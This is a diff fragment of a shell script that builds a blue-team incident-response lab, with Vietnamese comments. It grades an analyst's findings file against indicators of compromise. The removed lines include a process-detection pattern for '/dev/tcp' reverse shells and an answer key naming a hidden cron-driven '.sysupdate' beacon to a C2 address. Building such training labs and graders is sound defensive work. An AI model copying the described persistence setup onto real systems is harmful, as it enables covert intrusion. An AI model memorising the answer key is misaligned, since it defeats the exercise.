+# SLA: ket noi lanh tinh toi SIEM (.20) con song? (khong chan bua lam dut giam sat)
+SL=$(ss -tn 2>/dev/null | grep -c '172.20.0.20:')
+[ "${SL:-0}" -ge 1 ] && echo "SLA_OK"
 
-echo "=== tien trinh nghi ngo ==="
-ps -ef 2>/dev/null | grep -E 'sysupdate|/dev/tcp' | grep -v grep | sed 's/^/PROC: /'
+# Bao cao IOC (chi in OK). Cong ky vong lay tu CHINH dong beacon trong log giam sat
+# (/var/log/netmon.log, 644 - world readable; cong von la IOC phai san ra, khong phai bi mat).
+F=/home/analyst/findings.txt
+grep '^C2_IP=' "$F" 2>/dev/null | grep -q '172.20.0.5' && echo "REP_IP_OK"
+TP=$(grep 'dst=172.20.0.5' /var/log/netmon.log 2>/dev/null | grep -oE 'dport=[0-9]+' | grep -oE '[0-9]+' | head -1)
+[ -n "$TP" ] && grep '^C2_PORT=' "$F" 2>/dev/null | grep -q "$TP" && echo "REP_PORT_OK"
+grep '^MAL_PROC=' "$F" 2>/dev/null | grep -qi 'kworker' && echo "REP_PROC_OK"
 
-echo "C2_CONN=$(ss -tn 2>/dev/null | grep -c '172.20.0.5:')"
-
-echo "=== findings.txt (bao cao analyst) ==="
-cat /home/analyst/findings.txt 2>/dev/null
-
-echo "=== (GV doi chieu) IOC that: script=/usr/local/bin/.sysupdate ; cron=/etc/cron.d/sysupdate (moi phut) ; C2=172.20.0.5 ==="
+exit 0
 __EOF_TH_7k2m__
 mkdir -p "$LAB/target/_bin"
 cat > "$LAB/target/_bin/treataslocal" <<'__EOF_TH_7k2m__'
 cron
 wazuh-agent
 __EOF_TH_7k2m__
-
 echo ">> Cap quyen thuc thi + chuan hoa EOL (LF)"
 chmod +x "$LAB"/attacker/_bin/*.sh "$LAB"/target/_bin/* "$LAB"/siem/_bin/* "$LAB"/defender/_bin/*.sh "$LAB"/siem/*.sh "$LAB"/attacker/*.py 2>/dev/null || true
 find "$LAB" -type f -exec sed -i 's/\r$//' {} +
